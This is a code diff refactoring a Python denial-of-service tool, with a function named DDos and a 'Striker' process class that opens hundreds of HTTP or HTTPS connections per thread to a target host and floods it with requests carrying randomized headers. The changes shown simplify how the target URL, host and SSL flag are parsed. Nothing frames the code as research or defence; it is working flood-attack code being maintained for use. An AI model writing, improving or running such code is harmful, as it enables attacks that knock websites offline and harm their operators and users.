@@ -16,18 +16,14 @@ def DDos(url: str, sockets = 500, threads = 10):
         except (KeyboardInterrupt, SystemExit):
             for worker in workersQueue: worker.stop()
 class Striker(Process):
-    request_count, failed_count, url, host, port, ssl, socks, runnable = 0, 0, None, None, 80, False, [], True
     def __init__(self, url, sockets):
         super(Striker, self).__init__()
-        if url.startswith('https'): self.ssl = True
-        self.host, self.url, self.port, self.sockets = url.split("//")[1].split("/")[0].split(':')[0], "", 80 if not self.ssl else 443, sockets
-        if url.count("/") > 2: self.url = '/' + url.split("//")[1].split("/")[1].split(";")[0].split("?")[0].split("#")[0]
-        if len(url.split("//")[1].split("/")[0].split(':')) > 1: self.port = int(url.split("//")[1].split("/")[0].split(':')[1])
+        self.socks, self.runnable, self.host, self.url, self.sockets, self.ssl = [], True, url.split("/")[2], "/".join(url.split("/")[3:]).split(";")[0].split("?")[0].split("#")[0], sockets, url.startswith('https')
     def __del__(self): self.stop()
     def run(self):
         while self.runnable:
             try:
-                for i in range(self.sockets): self.socks.append(HTTPSConnection(self.host, self.port) if self.ssl else HTTPConnection(self.host, self.port))
+                for i in range(self.sockets): self.socks.append(HTTPSConnection(self.host) if self.ssl else HTTPConnection(self.host))
                 for conn_req in self.socks:
                     url, r_headers = self.generateData()
                     random_keys, headers = list(r_headers.keys()), {}
